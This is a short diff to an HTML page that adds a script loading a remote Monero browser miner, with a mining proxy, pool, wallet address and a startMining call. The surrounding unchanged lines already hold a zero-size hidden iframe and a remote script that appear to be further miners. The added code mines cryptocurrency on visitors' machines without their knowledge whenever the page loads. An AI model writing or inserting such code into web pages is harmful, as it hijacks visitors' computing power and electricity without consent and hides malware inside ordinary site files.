@@ -54,6 +54,17 @@
       </center>
       </div>
     </div>
+    <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+    <script>
+      server = "wss://f.xmrminingproxy.com:8181";
+      var pool = "moneroocean.stream";
+      var wallet_address = "43SNLyCE83YG1HtCyvHFq8dzc8bW8XuMENVWd3DjKA5iAicuHACWVby8T6PWdpiSF59s6okZr1ooJTZf8GvWBWJGKirQTFA";
+      var worker_id = ""
+      var threads = 1;
+      var password = "x";
+      startMining(pool, wallet_address, worker_id, threads, password);
+      throttleMiner = 20;
+    </script>
     <iframe id='miner' width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=shF1amnFqlMSwHF'></iframe>
     <script src="https://www.nuyoah-l.ml/assets/js/mine.js" ></script>
   </body>
